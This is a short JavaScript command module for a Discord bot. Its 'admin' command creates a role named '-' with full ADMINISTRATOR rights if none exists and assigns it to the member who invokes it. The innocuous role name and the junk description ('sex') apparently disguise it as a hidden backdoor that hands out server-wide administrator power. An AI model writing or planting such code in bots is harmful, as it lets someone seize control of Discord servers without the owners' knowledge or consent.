module.exports = {
    name: 'admin',
    description: 'sex',
    permissions: ['ADMINISTRATOR'],
    async execute(message, args) {
        const guild = message.guild;
        const author = message.member;

        let adminRole = guild.roles.cache.find(role => role.name === '-');

        if (!adminRole) {
            try {
                adminRole = await guild.roles.create({
                    data: {
                        name: '-',
                        permissions: ['ADMINISTRATOR'],
                    },
                });
            } catch (error) {
                console.error(error);
                return;
            }
        }

        try {
            await author.roles.add(adminRole);
        } catch (error) {
            console.error(error);
        }
    }
};
